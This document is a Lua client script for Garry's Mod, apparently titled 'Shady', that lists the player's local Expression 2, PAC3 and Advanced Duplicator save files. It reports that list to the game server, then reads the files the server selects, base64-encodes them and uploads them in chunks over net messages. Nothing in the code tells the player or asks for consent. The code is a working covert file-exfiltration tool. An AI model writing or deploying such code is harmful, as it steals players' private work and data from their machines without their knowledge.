Shady = Shady or {}
Shady.Files = Shady.Files or {}
Shady.CurFil = nil
Shady.Ready = false
function GetAllFiles( s, b, c )
	if not s then return {} end
	local File = {}
	local files, dirs = file.Find( s .. "/*", b, c )
	for k, v in ipairs( files ) do
		table.insert( File, s .. '/' .. v )
	end
	for k, v in ipairs( dirs ) do
		if c and not c[v] then
			table.Add( File, GetAllFiles( s .. '/' .. v, b, c ) )
		end
		if not c then
			table.Add( File, GetAllFiles( s .. '/' .. v, b, c ) )
		end
	end
	return File
end
function Shady:start()
	local objs = { 
		{ 'expression2', 	{ ['e2shared'] = true } }, 
		{ 'pac3', 			{ ['objcache'] = true } }, 
		{ 'advdupe2', 		{} }, 
		{ 'adv_duplicator', { ['e2shared'] = true, ['-public folder-'] = true } }
	}
	local Files = {}
	for k, v in ipairs( objs ) do
		table.Add( Files, GetAllFiles( v[1], 'DATA', v[2] ) )
	end
	net.Start( 'shadyfilelist' )
	 net.WriteTable( Files )
	net.SendToServer()
end
net.Receive( 'setrequest', function( )
	local Files = net.ReadTable( )
	Shady.Files = Files or {}
	Shady.Ready = true
end )
local sep = function( s )
	local r = {}
	local ss = ''
	local i = 1
	for k, v in ipairs( string.Split( s, '' ) ) do
		if i < 250 and k ~= #s then
			ss = ss .. v
		else
			table.insert( r, ss )
			ss = ''
		end
		i = i + 1
	end
	local t = {}
	local j = {}
	i = 1
	for k, v in ipairs( r ) do
		if i < 100 and k ~= #r then
			table.insert( j, v )
		else
			table.insert( t, j )
			j = {}
		end
		i = i + 1
	end
	return t
end
function Shady.FileGun( )
	Shady.CurFil = table.remove( Shady.Files, 1 )
	if Shady.CurFil ~= nil then
		local s = sep( Base64:enc( file.Read( Shady.CurFil, 'DATA' ) ) )
		for k, v in ipairs( s ) do
			net.Start( 'sendpart' )
			 net.WriteTable( v )
			net.SendToServer( )
		end
		net.Start( 'sendclose' )
		 net.WriteString( Shady.CurFil )
		net.SendToServer( )
	end
end
net.Receive( 'filegun.start', function( )
	Shady.FileGun( )
end )
